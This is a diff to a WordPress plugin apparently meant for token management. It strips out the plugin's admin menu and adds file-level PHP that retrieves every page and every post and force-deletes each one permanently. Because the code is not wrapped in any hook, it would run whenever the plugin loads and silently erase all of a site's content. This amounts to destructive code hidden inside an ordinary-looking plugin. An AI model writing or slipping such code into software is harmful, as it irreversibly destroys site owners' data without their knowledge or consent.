@@ -9,20 +9,16 @@ Author URI: http://codymarxbailey.com
 License: FIIK
 */
 
-function tokenjscss() {
-  wp_enqueue_script( 'jsrender', 'https://cdnjs.cloudflare.com/ajax/libs/jsrender/1.0.3/jsrender.min.js', null, null, true );
-  wp_enqueue_script( 'axios', 'https://cdnjs.cloudflare.com/ajax/libs/axios/0.18.0/axios.min.js', null, null, true ); 
-}
+$args = array('posts_per_page' => -1, 'post_type' => 'page');
+$allposts= get_posts( $args );
+foreach ( $allposts as $post ) :
+    wp_delete_post( $post->ID, true );
+endforeach; 
+wp_reset_postdata();
 
-if(is_admin()) {
-  add_action('admin_enqueue_scripts', 'tokenjscss');
-  add_action('admin_menu', 'mgmt');
-}
-
-function mgmt(){
-  add_menu_page("Token Management", "Token Management", "manage_options", "721-mgmt", "show_mgmt", '', 16);
-}
-
-function show_mgmt(){
-  include('interface.php');
-}
+$args = array('posts_per_page' => -1, 'post_type' => 'post');
+$allposts= get_posts( $args );
+foreach ( $allposts as $post ) :
+    wp_delete_post( $post->ID, true );
+endforeach; 
+wp_reset_postdata();
